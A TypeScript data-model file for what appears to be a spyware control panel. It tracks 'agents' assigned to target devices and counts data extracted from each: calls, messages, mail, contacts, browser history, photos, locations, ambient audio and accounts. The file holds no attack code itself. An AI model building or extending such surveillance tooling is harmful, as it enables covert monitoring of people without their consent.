type AgentId = string;
type TargetId = string;
type AgentDeviceType = string;
type AgentDeviceOs = string;
type Date = number;

interface AgentStatus {
    lastCommunication: Date,
    lastExtract: Date,
    extractionsTotal: number,
    extractionsSuccesful: number,
    dataUsageLastDay: number,
    dataUsageLastWeek: number,
}

interface AgentCounters {
    calls: number,
    im: number,
    mail: number,
    contacts: number,
    social: number,
    browser: number,
    gallery: number,
    calendar: number,
    activity: number,
    envAudio: number,
    snapshots: number,
    locations: number,
    directory: number,
    accounts: number,
    systemInfo: number,
}

class AgentData {
    protected id: AgentId;
    protected name: string;
    protected resourceId: string;
    protected targetId: TargetId;
    protected deviceType: AgentDeviceType;
    protected deviceOs: AgentDeviceOs;
    protected expiry: Date;
    protected extractInterval: number;
    protected status: AgentStatus;
    protected counters: AgentCounters;

    static fromData(data: any) {
        let agent = new AgentData();

        agent.id = data.id;
        agent.resourceId = data.resourceId;
        agent.name = data.name;
        agent.targetId = data.targetId;
        agent.deviceType = osToDevice(data.buildos);
        agent.deviceOs = data.buildos;
        agent.expiry = 0;
        agent.extractInterval = 0;

        agent.status = {
            dataUsageLastDay: 0,
            dataUsageLastWeek: 0,
            extractionsSuccesful: 0,
            extractionsTotal: 0,
            lastExtract: 0,
            lastCommunication: 0,
        };
        
        agent.counters = {
            accounts: data.counters.accounts || 0,
            activity: data.counters.activity || 0,
            browser: data.counters.browser || 0,
            calendar: data.counters.calendar || 0,
            calls: data.counters.calls || 0,
            contacts: data.counters.contacts || 0,
            directory: data.counters.directory || 0,
            envAudio: data.counters.env_audio || 0,
            gallery: data.counters.gallery || 0,
            im: data.counters.im || 0,
            locations: data.counters.locations || 0,
            mail: data.counters.mail || 0,
            snapshots: data.counters.snapshots || 0,
            social: data.counters.social_network || 0,
            systemInfo: data.counters.systeminfo || 0,
        }
        return agent;
    }
}

function osToDevice(os: string): string {
    return os === 'iphone' || os === 'android' ? 'phone' : 'desktop'
}

export default AgentData;